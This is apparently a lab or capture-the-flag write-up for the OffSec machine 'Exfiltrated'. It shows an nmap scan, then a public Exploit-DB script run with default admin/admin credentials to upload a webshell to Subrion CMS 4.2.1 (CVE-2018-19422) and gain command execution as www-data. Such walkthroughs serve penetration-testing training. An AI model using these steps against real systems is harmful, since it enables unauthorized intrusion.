##### Tags: `Passwd-Overwrite`  `CVE-2020-11651`  `CVE-2020-11652`  `RCE`  `User-add`

# 🐧Exfiltrated🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.242.163
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 21:26 AEDT
Warning: 192.168.242.163 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.242.163
Host is up (0.24s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
48536/tcp filtered unknown
55111/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The web is running Subrion CMS v 4.2.1  
We search it from google and there is a script for Subrion CMS 4.2.1 - Arbitrary File Upload   
https://www.exploit-db.com/exploits/49876  

We then run it by using default credential admin admin
```
─$ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: Q0LN0i9uiBAPVzhNvx5lq4hkmMTPk1ffJFf6xni8
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: galnxynlbbzgyyi

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/galnxynlbbzgyyi.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
